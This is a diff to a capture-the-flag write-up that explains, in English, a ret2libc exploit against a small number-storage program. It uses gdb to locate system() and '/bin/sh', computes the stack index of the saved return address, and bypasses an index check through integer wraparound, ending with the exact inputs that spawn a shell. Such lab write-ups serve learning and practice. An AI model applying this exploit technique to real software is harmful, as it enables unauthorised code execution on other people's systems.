@@ -4,15 +4,19 @@ We get the c source code of the program
 
 ### step 2: Code analysis
 
+This program appears to be a simple command-line interface for storing, reading, and managing numbers in an array-like data storage :
+
+- The program defines functions for storing, reading, and managing numbers in an integer array.
+- It reads user commands (store, read, quit) and performs corresponding actions.
+- The main loop repeatedly prompts the user for commands, executes them, and provides feedback.
+- The program continues until the user decides to quit or an internal error occurs.
+- We cannot use the env for the exploit because it is cleared at the beginning of the `main` function
+- As a result we will try to find a `/bin/sh` occurence and overflow the number storage to gain our flag
 
 
+### step 3: Find occurence of /bin/sh
 
-index overflow
-pas d'utilisation possible de l'env car clear au début du code !!
-
-
-### Find occurence of /bin/sh
-
+```
 (gdb) break main
 Breakpoint 1 at 0x8048729
 (gdb) r
@@ -26,11 +30,15 @@ $2 = (<text variable, no debug info> *) 0xf7e6aed0 <system>
 warning: Unable to access target memory at 0xf7fd3b74, halting search.
 1 pattern found.
 (gdb) 
+```
 
-system address : 0xf7e6aed0
-bin/sh address : 0xf7f897ec
+As a result we have :
+system address : `0xf7e6aed0`
+bin/sh address : `0xf7f897ec`
 
-### Find EIP of main function
+### step 4: Find EIP of main function
+
+```
 (gdb) b main
 Note: breakpoint 1 also set at pc 0x8048729.
 Breakpoint 3 at 0x8048729
@@ -45,12 +53,11 @@ Stack level 0, frame at 0xffffd710:
  Saved registers:
   ebp at 0xffffd708, eip at 0xffffd70c
 (gdb) 
+```
 
-=> eip address 0xffffd70c de la fonction main
-0x8048741
-### Find address of tab[100]
+=> The eip address of the `main` function is `0xffffd70c`
 
-address is 0xffffcd24
+### step 5: Find address of tab[100]
 
 ```
 gdb
@@ -74,34 +81,83 @@ disas main
    r
    x $eax
 => 0xffffd544:     0x00000000
-
 ```
 
-### Calculate tab index to overwrite
+=> The address of the tab[100] begining is `0xffffd544`
 
-interval between eip and tab 0xffffd70c - 0xffffd544 = 0x9E8 = 456 / 4 = 114
-On divise par 4 car index d'int donc 4 bytes
+### step 6: Calculate tab index to overwrite
 
-### Set sellcode to eip+8
+The interval between eip and tab is :
+0xffffd70c - 0xffffd544 = 0x9E8 = 456 / 4 = 114
+We divide the interval by 4 because it is an index of int which are 4 bytes long
 
-0xf7f897ec => 4160264172
+### step 7 : Set sellcode to eip + 8 bytes
 
+The shellcode address `0xf7f897ec`as an int is 4160264172
+We set this address to the index 116 (eip + 8 bytes / 4)
+
+```
 insruction : store
 number : 4160264172
-index : 116 (eip + 2 * 4)
+index : 116
+```
 
-### Set system address to eip
+### step 8 : Set system address to eip
 
-0xf7e6aed0 => 4159090384
+The system address `0xf7e6aed0` as an int is 4159090384
 
+```
 insruction : store
 number : 4159090384
 index : 114
+```
 
-problème : 114 est divisible par 3
+However, we have a final issue. 114 can be divided by 3 so we can't write a number at the index 114 because we have this protection :
+```
+if ((input_index % 3 == 0) || (input_nbr >> 0x18 == 0xb7)) {
+    puts(" *** ERROR! ***");
+    puts("   This index is reserved for wil!");
+    puts(" *** ERROR! ***");
+    res = 1;
+}
+```
+
+### step 9 : Use the UINTMAX overflow for the final exploit
+
+To write a number at the index 114 even if 114 can be divided by three and therefore is protected we use the UINTMAX overflow :
+
+114 * 4 = 456 bytes
 (UINTMAX + 1) + 456 = 456
 (4294967295 + 1 + 456) / 4 = 1073741938
 
-and then quit and we get a shell 
+As a conclusion, here is our second input :
+
+```
+insruction : store
+number : 4159090384
+index : 1073741938
+```
+
+Then we quit and we get a shell !
+
+### step 10 : Final exploit
+
+Here are the two inputs :
+
+```
+insruction : store
+number : 4160264172
+index : 116
+```
+
+```
+insruction : store
+number : 4159090384
+index : 1073741938
+```
+Then we quit and we get a shell !
+
+
+### Ressources :
 
 https://stackoverflow.com/questions/19124095/return-to-lib-c-buffer-overflow-exercise-issue
